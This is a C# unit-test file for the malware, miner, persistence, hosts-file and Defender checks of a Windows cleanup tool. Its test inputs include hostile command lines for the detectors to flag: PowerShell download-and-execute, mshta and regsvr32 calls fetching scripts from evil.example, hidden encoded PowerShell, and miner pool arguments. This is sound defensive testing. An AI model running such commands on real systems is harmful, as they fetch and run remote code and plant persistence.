using Declutter.Core.Safety;
using Declutter.Core.Security;
using Declutter.Core.Startup;

namespace Declutter.Core.Tests;

public class SecurityTests : IDisposable
{
    private readonly FakeMachine _m = new();
    private KnownFolders F => _m.Folders;
    public void Dispose() => _m.Dispose();

    private static readonly Dictionary<string, SignatureInfo> NoSignatures = new(StringComparer.OrdinalIgnoreCase);

    private string Sys32(string exe) => Path.Combine(F.WindowsDir, "System32", exe);
    private string Roaming(string exe) => Path.Combine(F.RoamingAppData, "Updater", exe);
    private string ProgramFiles(string exe) => Path.Combine(F.ProgramFiles, "Vendor", exe);

    private static ProcessInfo Proc(int pid, string name, string? path, string? cmd = null, double cpu = 0) => new(pid, name, path, cmd, cpu);

    private static Dictionary<string, SignatureInfo> Signed(params (string Path, string Status)[] s) =>
        s.ToDictionary(x => x.Path, x => new SignatureInfo(x.Status, "CN=Vendor"), StringComparer.OrdinalIgnoreCase);

    // ---- Miners ---------------------------------------------------------------------------------

    [Theory]
    [InlineData("xmrig.exe")]
    [InlineData("XMRig.exe")]
    [InlineData("nbminer.exe")]
    [InlineData("t-rex.exe")]
    public void Miner_KnownName_IsCritical(string name)
    {
        var outcome = MinerCheck.Evaluate([Proc(10, name, Roaming(name))], [], NoSignatures, F);
        var finding = Assert.Single(outcome.Findings);
        Assert.Equal(Severity.Critical, finding.Severity);
        Assert.Contains(FindingAction.EndProcess, finding.Actions);
    }

    [Theory]
    [InlineData("\"C:\\x\\svc.exe\" -o stratum+tcp://pool.example.com:3333 -u wallet")]
    [InlineData("helper.exe --donate-level 1 --url x")]
    [InlineData("helper.exe -o gulf.moneroocean.stream:10128")]
    public void Miner_CommandLineMarkers_AreCritical_EvenWithAnInnocentName(string cmd)
    {
        var outcome = MinerCheck.Evaluate([Proc(10, "WindowsHelper.exe", Roaming("WindowsHelper.exe"), cmd)], [], NoSignatures, F);
        Assert.Equal(Severity.Critical, Assert.Single(outcome.Findings).Severity);
    }

    [Fact]
    public void Miner_PoolPortConnection_IsAWarning()
    {
        var proc = Proc(42, "thing.exe", Roaming("thing.exe"));
        var conn = new TcpConnection("192.168.1.2", 50000, "203.0.113.9", 3333, "ESTABLISHED", 42);

        var finding = Assert.Single(MinerCheck.Evaluate([proc], [conn], NoSignatures, F).Findings);

        Assert.Equal(Severity.Warning, finding.Severity);
        Assert.Contains("3333", finding.Explanation);
    }

    [Fact]
    public void Miner_PoolPort_FromSignedProgramFilesApp_IsIgnored()
    {
        string path = ProgramFiles("game.exe");
        var conn = new TcpConnection("192.168.1.2", 50000, "203.0.113.9", 4444, "ESTABLISHED", 42);
        Assert.Empty(MinerCheck.Evaluate([Proc(42, "game.exe", path)], [conn], Signed((path, "Valid")), F).Findings);
    }

    [Fact]
    public void Miner_LoopbackPoolPort_IsIgnored()
    {
        var conn = new TcpConnection("127.0.0.1", 50000, "127.0.0.1", 5555, "ESTABLISHED", 42);
        Assert.Empty(MinerCheck.Evaluate([Proc(42, "adb.exe", Roaming("adb.exe"))], [conn], NoSignatures, F).Findings);
    }

    [Fact]
    public void Miner_HighCpu_UnsignedInAppData_IsAWarning()
    {
        string path = Roaming("svc.exe");
        var outcome = MinerCheck.Evaluate([Proc(7, "svc.exe", path, cpu: 80)], [], Signed((path, "NotSigned")), F);
        var finding = Assert.Single(outcome.Findings);
        Assert.Equal(Severity.Warning, finding.Severity);
        Assert.Contains("80%", finding.Title);
    }

    [Fact]
    public void Miner_HighCpu_SignedApps_AreNotFlagged()
    {
        string game = ProgramFiles("game.exe");
        string discord = Roaming("Discord.exe");
        var outcome = MinerCheck.Evaluate(
            [Proc(1, "game.exe", game, cpu: 90), Proc(2, "Discord.exe", discord, cpu: 40)], [],
            Signed((game, "Valid"), (discord, "Valid")), F);
        Assert.Empty(outcome.Findings);
        Assert.True(outcome.Passed);
    }

    [Fact]
    public void Miner_HighCpu_InProgramFiles_IsNotFlagged_EvenIfTheSignatureCantBeRead()
    {
        string path = ProgramFiles("encoder.exe");
        Assert.Empty(MinerCheck.Evaluate([Proc(3, "encoder.exe", path, cpu: 95)], [], Signed((path, "UnknownError")), F).Findings);
        Assert.Empty(MinerCheck.Evaluate([Proc(4, "svchost.exe", Sys32("svchost.exe"), cpu: 95)], [], Signed((Sys32("svchost.exe"), "NotSigned")), F).Findings);
    }

    [Fact]
    public void Miner_LowCpu_UnsignedApp_IsNotFlagged() =>
        Assert.Empty(MinerCheck.Evaluate([Proc(1, "tool.exe", Roaming("tool.exe"), cpu: 3)], [], NoSignatures, F).Findings);

    [Fact]
    public void Miner_ReportsAProcessOnlyOnce()
    {
        string path = Roaming("xmrig.exe");
        var conn = new TcpConnection("10.0.0.2", 50000, "203.0.113.9", 3333, "ESTABLISHED", 9);
        var outcome = MinerCheck.Evaluate([Proc(9, "xmrig.exe", path, "xmrig -o stratum+tcp://x:3333", 95)], [conn], NoSignatures, F);
        Assert.Single(outcome.Findings);
    }

    // ---- Impostors ------------------------------------------------------------------------------

    [Fact]
    public void Impostor_SvchostOutsideWindows_IsCritical()
    {
        var finding = Assert.Single(ImpostorCheck.Evaluate([Proc(5, "svchost.exe", Roaming("svchost.exe"))], F).Findings);
        Assert.Equal(Severity.Critical, finding.Severity);
    }

    [Fact]
    public void Impostor_GenuineSystemProcesses_AreFine()
    {
        var processes = new[]
        {
            Proc(1, "svchost.exe", Sys32("svchost.exe")),
            Proc(2, "svchost.exe", Path.Combine(F.WindowsDir, "SysWOW64", "svchost.exe")),
            Proc(3, "explorer.exe", Path.Combine(F.WindowsDir, "explorer.exe")),
            Proc(4, "WmiPrvSE.exe", Path.Combine(F.WindowsDir, "System32", "wbem", "WmiPrvSE.exe")),
            Proc(5, "csrss.exe", null), // protected: path not readable
        };
        Assert.Empty(ImpostorCheck.Evaluate(processes, F).Findings);
    }

    [Fact]
    public void Impostor_ExplorerInSystem32_IsFlagged() =>
        Assert.Single(ImpostorCheck.Evaluate([Proc(1, "explorer.exe", Sys32("explorer.exe"))], F).Findings);

    [Theory]
    [InlineData("scvhost.exe")]
    [InlineData("winlogin.exe")]
    [InlineData("WindowsUpdate.exe")]
    public void Impostor_LookAlikeNames_AreFlagged(string name) =>
        Assert.Equal(Severity.Critical, Assert.Single(ImpostorCheck.Evaluate([Proc(1, name, Roaming(name))], F).Findings).Severity);

    [Fact]
    public void Impostor_OrdinaryNames_AreNotGuessedAt() =>
        Assert.Empty(ImpostorCheck.Evaluate([Proc(1, "host.exe", Roaming("host.exe")), Proc(2, "lsass2go.exe", Roaming("lsass2go.exe"))], F).Findings);

    // ---- Startup persistence ---------------------------------------------------------------------

    private static StartupItem Item(string name, string command, string? file = null, bool enabled = true) => new()
    {
        Id = "RegistryUser|" + name, Name = name, Key = name, Command = command, Source = StartupSource.RegistryUser,
        Enabled = enabled, FilePath = file,
    };

    [Theory]
    [InlineData("powershell.exe -NoP -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA")]
    [InlineData("powershell -nop -c \"IEX (New-Object Net.WebClient).DownloadString('http://x/a')\"")]
    [InlineData("powershell.exe -WindowStyle Hidden -File C:\\Users\\me\\AppData\\Roaming\\a.ps1")]
    [InlineData("mshta.exe https://evil.example/x.hta")]
    [InlineData("mshta vbscript:Execute(\"CreateObject(...)\")")]
    [InlineData("regsvr32 /s /n /u /i:http://evil.example/file.sct scrobj.dll")]
    [InlineData("wscript.exe //B \"C:\\Users\\me\\AppData\\Roaming\\x.vbs\"")]
    [InlineData("cmd.exe /c powershell -w hidden -c calc")]
    [InlineData("rundll32.exe C:\\Users\\me\\AppData\\Local\\Temp\\x.dll,Start")]
    public void ScriptTricks_AreRecognised(string command) => Assert.NotNull(PersistenceCheck.DescribeScriptTrick(command));

    [Theory]
    [InlineData("\"C:\\Program Files\\Spotify\\Spotify.exe\" --autostart")]
    [InlineData("powershell.exe -File C:\\Scripts\\backup.ps1")]
    [InlineData("powershell -NoProfile -Command Get-Index")]
    [InlineData("C:\\Windows\\system32\\rundll32.exe C:\\Windows\\system32\\shell32.dll,Control_RunDLL")]
    [InlineData("wscript.exe C:\\Tools\\clock.vbs")]
    [InlineData("")]
    public void NormalCommands_AreNotTricks(string command) => Assert.Null(PersistenceCheck.DescribeScriptTrick(command));

    [Fact]
    public void Persistence_HiddenScript_IsCriticalWithDisableAction()
    {
        var finding = Assert.Single(PersistenceCheck.Evaluate([Item("Updater", "powershell -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0A")], NoSignatures, F).Findings);
        Assert.Equal(Severity.Critical, finding.Severity);
        Assert.Contains(FindingAction.DisableStartup, finding.Actions);
        Assert.Equal("RegistryUser|Updater", finding.StartupItemId);
    }

    [Fact]
    public void Persistence_DisabledItems_AreIgnored() =>
        Assert.Empty(PersistenceCheck.Evaluate([Item("Updater", "powershell -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0A", enabled: false)], NoSignatures, F).Findings);

    [Fact]
    public void Persistence_StartingFromTemp_IsCriticalUnlessSigned()
    {
        string temp = Path.Combine(F.TempDir, "abc123.exe");
        Assert.Equal(Severity.Critical, Assert.Single(PersistenceCheck.Evaluate([Item("x", temp, temp)], NoSignatures, F).Findings).Severity);
        Assert.Equal(Severity.Warning, Assert.Single(PersistenceCheck.Evaluate([Item("x", temp, temp)], Signed((temp, "Valid")), F).Findings).Severity);
    }

    [Fact]
    public void Persistence_UnsignedInAppData_IsAWarning_ButSignedIsFine()
    {
        string path = Roaming("helper.exe");
        Assert.Equal(Severity.Warning, Assert.Single(PersistenceCheck.Evaluate([Item("h", path, path)], Signed((path, "NotSigned")), F).Findings).Severity);
        Assert.Empty(PersistenceCheck.Evaluate([Item("h", path, path)], Signed((path, "Valid")), F).Findings);
        Assert.Empty(PersistenceCheck.Evaluate([Item("h", path, path)], NoSignatures, F).Findings); // unknown: say nothing
    }

    [Fact]
    public void Persistence_BrokenSignature_IsAWarning()
    {
        string path = ProgramFiles("app.exe");
        var finding = Assert.Single(PersistenceCheck.Evaluate([Item("a", path, path)], Signed((path, "HashMismatch")), F).Findings);
        Assert.Contains("HashMismatch", finding.Explanation);
    }

    // ---- Hosts & proxy ---------------------------------------------------------------------------

    [Fact]
    public void Hosts_DefaultFile_IsClean()
    {
        const string hosts = "# Copyright (c) 1993-2009 Microsoft Corp.\r\n#\r\n#\t127.0.0.1       localhost\r\n#\t::1             localhost\r\n";
        Assert.True(NetworkSettingsCheck.EvaluateHosts(hosts).Passed);
        Assert.Empty(NetworkSettingsCheck.EvaluateHosts(hosts).Findings);
    }

    [Fact]
    public void Hosts_RedirectingSecuritySites_IsCritical()
    {
        const string hosts = "127.0.0.1 localhost\r\n0.0.0.0 update.microsoft.com\r\n0.0.0.0 www.malwarebytes.com mbam.example # blocked\r\n";
        var finding = Assert.Single(NetworkSettingsCheck.EvaluateHosts(hosts).Findings);
        Assert.Equal(Severity.Critical, finding.Severity);
        Assert.Contains("update.microsoft.com", finding.Evidence);
        Assert.Contains("www.malwarebytes.com", finding.Evidence);
    }

    [Fact]
    public void Hosts_AdBlockEntries_AreJustInfo()
    {
        var outcome = NetworkSettingsCheck.EvaluateHosts("0.0.0.0 ads.example.net\n0.0.0.0 tracker.example.org\n");
        Assert.Equal(Severity.Info, Assert.Single(outcome.Findings).Severity);
        Assert.True(outcome.Passed);
    }

    [Fact]
    public void Hosts_Parse_HandlesCommentsTabsAndMultipleNames()
    {
        var entries = NetworkSettingsCheck.ParseHosts("10.0.0.1\tA.local b.local # c.local\n# 1.1.1.1 x\n");
        Assert.Equal(["a.local", "b.local"], entries.Select(e => e.HostName));
    }

    [Fact]
    public void Proxy_RemoteProxy_IsAWarning_LoopbackIsFine()
    {
        Assert.Single(NetworkSettingsCheck.EvaluateProxy(true, "proxy.example.com:8080", null).Findings);
        Assert.Empty(NetworkSettingsCheck.EvaluateProxy(true, "127.0.0.1:8888", null).Findings);
        Assert.Empty(NetworkSettingsCheck.EvaluateProxy(false, "proxy.example.com:8080", null).Findings);
        Assert.Single(NetworkSettingsCheck.EvaluateProxy(false, null, "http://wpad.example/proxy.pac").Findings);
    }

    // ---- Defender --------------------------------------------------------------------------------

    private static DefenderStatus Healthy => new()
    {
        AntivirusEnabled = true, RealTimeProtectionEnabled = true, SignatureAgeDays = 0, QuickScanAgeDays = 2, FullScanAgeDays = 100, RunningMode = "Normal",
    };

    [Fact]
    public void Defender_Healthy_Passes() => Assert.Empty(DefenderCheck.EvaluateProtection(Healthy, []).Findings);

    [Fact]
    public void Defender_Off_WithNoOtherAntivirus_IsCritical()
    {
        var finding = Assert.Single(DefenderCheck.EvaluateProtection(Healthy with { AntivirusEnabled = false }, []).Findings);
        Assert.Equal(Severity.Critical, finding.Severity);
        Assert.Equal("No antivirus is protecting this PC", finding.Title);
    }

    [Fact]
    public void Defender_Off_WithAnotherAntivirus_Passes()
    {
        var outcome = DefenderCheck.EvaluateProtection(Healthy with { AntivirusEnabled = false, RunningMode = "Passive Mode" },
            [new AntivirusProduct("Bitdefender Antivirus", true, true), new AntivirusProduct("Windows Defender", false, true)]);
        Assert.True(outcome.Passed);
        Assert.Contains("Bitdefender", outcome.PassedText);
    }

    [Fact]
    public void Bitdefender_IsNotMistakenForMicrosoftDefender()
    {
        Assert.False(new AntivirusProduct("Bitdefender Antivirus", true, true).IsDefender);
        Assert.True(new AntivirusProduct("Windows Defender", true, true).IsDefender);
        Assert.True(new AntivirusProduct("Microsoft Defender Antivirus", true, true).IsDefender);
    }

    [Fact]
    public void Defender_RealTimeOff_IsCritical() =>
        Assert.Equal("Real-time protection is off",
            Assert.Single(DefenderCheck.EvaluateProtection(Healthy with { RealTimeProtectionEnabled = false }, []).Findings).Title);

    [Fact]
    public void Defender_OldDefinitionsAndNoScan_AreReported()
    {
        var findings = DefenderCheck.EvaluateProtection(Healthy with { SignatureAgeDays = 12, QuickScanAgeDays = null, FullScanAgeDays = null }, []).Findings;
        Assert.Contains(findings, f => f.Severity == Severity.Warning && f.Actions.Contains(FindingAction.UpdateDefinitions));
        Assert.Contains(findings, f => f.Severity == Severity.Info && f.Actions.Contains(FindingAction.RunQuickScan));
    }

    [Theory]
    [InlineData(397568u, true, true)]   // 0x061100: on, up to date
    [InlineData(393472u, false, true)]  // 0x060100: off
    [InlineData(266256u, true, false)]  // 0x041010: on, out of date
    public void SecurityCenter_ProductStateDecodes(uint state, bool enabled, bool upToDate)
    {
        var p = AntivirusProduct.FromProductState("X", state);
        Assert.Equal(enabled, p.Enabled);
        Assert.Equal(upToDate, p.UpToDate);
    }

    [Fact]
    public void Threats_ActiveAllowedAndRecent_AreClassified()
    {
        var now = DateTime.UtcNow;
        var threats = new[]
        {
            new DefenderThreat("Trojan:Win32/Wacatac", 1, ["file:_C:\\Users\\me\\Downloads\\crack.exe"], now.AddDays(-1)),
            new DefenderThreat("PUA:Win32/Presenoker", 5, [], now.AddDays(-3)),
            new DefenderThreat("Trojan:Script/Old", 3, [], now.AddDays(-2)),
            new DefenderThreat("Trojan:Script/Ancient", 3, [], now.AddDays(-200)),
        };

        var findings = DefenderCheck.EvaluateThreats(threats, now).Findings;

        var active = Assert.Single(findings, f => f.Severity == Severity.Critical);
        Assert.Equal("C:\\Users\\me\\Downloads\\crack.exe", active.FilePath);
        Assert.Single(findings, f => f.Severity == Severity.Warning);
        Assert.Contains("1 threat", Assert.Single(findings, f => f.Severity == Severity.Info).Title);
    }

    [Fact]
    public void Exclusions_Unreadable_IsInfoOnly()
    {
        var outcome = DefenderCheck.EvaluateExclusions(null, F);
        Assert.Equal(Severity.Info, Assert.Single(outcome.Findings).Severity);
        Assert.True(outcome.Passed);
    }

    [Fact]
    public void Exclusions_BroadFoldersAndRiskyExtensions_AreCritical()
    {
        var ex = new DefenderExclusions([F.UserProfile, Path.GetPathRoot(F.WindowsDir)!, Path.Combine(F.Documents!, "Projects", "build")], [], ["exe", ".txt"]);
        var findings = DefenderCheck.EvaluateExclusions(ex, F).Findings;

        Assert.Equal(3, findings.Count(f => f.Severity == Severity.Critical)); // profile, drive root, .exe
        Assert.Single(findings, f => f.Severity == Severity.Info && f.Evidence!.Contains("Projects"));
        Assert.DoesNotContain(findings, f => f.Evidence == ".txt");
    }

    [Fact]
    public void Exclusions_None_Pass() => Assert.Empty(DefenderCheck.EvaluateExclusions(new DefenderExclusions([], [], []), F).Findings);

    // ---- System ----------------------------------------------------------------------------------

    [Fact]
    public void Firewall_OffProfile_IsAWarning()
    {
        Assert.Empty(SystemCheck.EvaluateFirewall(new Dictionary<string, bool?> { ["Domain"] = true, ["Private"] = null }).Findings);
        Assert.Contains("Public", Assert.Single(SystemCheck.EvaluateFirewall(new Dictionary<string, bool?> { ["Public"] = false }).Findings).Title);
    }

    [Fact]
    public void Uac_Off_IsAWarning()
    {
        Assert.Empty(SystemCheck.EvaluateUac(true).Findings);
        Assert.Empty(SystemCheck.EvaluateUac(null).Findings);
        Assert.Single(SystemCheck.EvaluateUac(false).Findings);
    }

    [Fact]
    public void Wmi_ScriptConsumers_AreCritical()
    {
        var findings = SystemCheck.EvaluateWmi([
            new WmiConsumer("Updater", "CommandLineEventConsumer", "powershell -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0A"),
            new WmiConsumer("Vendor", "CommandLineEventConsumer", "C:\\Program Files\\Vendor\\tool.exe"),
        ]).Findings;
        Assert.Equal([Severity.Critical, Severity.Warning], findings.Select(f => f.Severity));
        Assert.Empty(SystemCheck.EvaluateWmi([]).Findings);
        Assert.Empty(SystemCheck.EvaluateWmi([new WmiConsumer("BVTConsumer", "CommandLineEventConsumer", "cscript KernCap.vbs")]).Findings);
    }

    // ---- Parsers & report ------------------------------------------------------------------------

    [Fact]
    public void Netstat_ParsesIPv4AndIPv6TcpLines()
    {
        const string output = """

            Active Connections

              Proto  Local Address          Foreign Address        State           PID
              TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       1140
              TCP    192.168.1.20:52114     203.0.113.9:3333       ESTABLISHED     8812
              TCP    [::1]:49671            [::1]:49672            HERGESTELLT     4412
              UDP    0.0.0.0:5353           *:*                                    2216
            """;
        var c = Parsers.ParseNetstat(output);
        Assert.Equal(3, c.Count);
        Assert.Equal(new TcpConnection("192.168.1.20", 52114, "203.0.113.9", 3333, "ESTABLISHED", 8812), c[1]);
        Assert.Equal("::1", c[2].RemoteAddress);
    }

    [Theory]
    [InlineData("CN=Microsoft Corporation, O=Microsoft Corporation, L=Redmond", "Microsoft Corporation")]
    [InlineData("O=Foo, CN=\"Bar, Inc\"", "Bar, Inc")]
    [InlineData(null, null)]
    public void SignerName_TakesTheCommonName(string? subject, string? expected) => Assert.Equal(expected, Parsers.SignerName(subject));

    [Theory]
    [InlineData("Valid", true, true)]
    [InlineData("NotSigned", false, false)]
    [InlineData("UnknownError", false, false)]
    [InlineData("HashMismatch", true, false)]
    [InlineData("NotTrusted", true, false)]
    public void SignatureStatus_Interpretation(string status, bool signed, bool valid)
    {
        var s = new SignatureInfo(status, null);
        Assert.Equal(signed, s.IsSigned);
        Assert.Equal(valid, s.IsValid);
    }

    [Fact]
    public void CpuPercent_IsShareOfWholeMachine()
    {
        Assert.Equal(50, Parsers.CpuPercent(TimeSpan.FromSeconds(4), TimeSpan.FromSeconds(2), 4));
        Assert.Equal(100, Parsers.CpuPercent(TimeSpan.FromSeconds(99), TimeSpan.FromSeconds(1), 1));
        Assert.Equal(0, Parsers.CpuPercent(TimeSpan.FromSeconds(1), TimeSpan.Zero, 4));
    }

    [Fact]
    public void Analyzer_HealthyPc_HasNoFindings_AndListsPassedChecks()
    {
        var evidence = new SecurityEvidence
        {
            Processes = [Proc(1, "svchost.exe", Sys32("svchost.exe"), cpu: 2)],
            Defender = Healthy,
            Exclusions = new DefenderExclusions([], [], []),
            HostsFile = "# nothing",
            UacEnabled = true,
            WmiConsumers = [],
        };

        var report = SecurityAnalyzer.Analyze(evidence, F, DateTime.UtcNow);

        Assert.Empty(report.Findings);
        Assert.Equal(11, report.Passed.Count);
        Assert.StartsWith("No signs", report.Headline);
        Assert.Single(report.TopCpu);
    }

    [Fact]
    public void Analyzer_SortsMostSeriousFirst_AndCountsThem()
    {
        var evidence = new SecurityEvidence
        {
            Processes = [Proc(9, "xmrig.exe", Roaming("xmrig.exe"), cpu: 90)],
            Defender = Healthy with { SignatureAgeDays = 20 },
            Exclusions = new DefenderExclusions([], [], []),
        };

        var report = SecurityAnalyzer.Analyze(evidence, F, DateTime.UtcNow);

        Assert.Equal(Severity.Critical, report.Findings[0].Severity);
        Assert.Equal(1, report.CriticalCount);
        Assert.Equal(1, report.WarningCount);
        Assert.Equal("1 thing needs your attention.", report.Headline);
    }

    [Fact]
    public void PathsToVerify_PicksSuspectsNotWindows()
    {
        var processes = new[]
        {
            Proc(1, "svchost.exe", Sys32("svchost.exe"), cpu: 1),
            Proc(2, "busy.exe", ProgramFiles("busy.exe"), cpu: 60),
            Proc(3, "helper.exe", Roaming("helper.exe")),
            Proc(4, "net.exe", ProgramFiles("net.exe")),
        };
        var connections = new[] { new TcpConnection("10.0.0.2", 1, "203.0.113.9", 14444, "ESTABLISHED", 4) };
        var startup = new[] { Item("s", "x", Roaming("startup.exe")), Item("w", "x", Sys32("ctfmon.exe")) };

        var paths = SecurityAnalyzer.PathsToVerify(processes, connections, startup, F);

        Assert.Equal(4, paths.Count);
        Assert.DoesNotContain(Sys32("svchost.exe"), paths);
        Assert.DoesNotContain(Sys32("ctfmon.exe"), paths);
    }
}
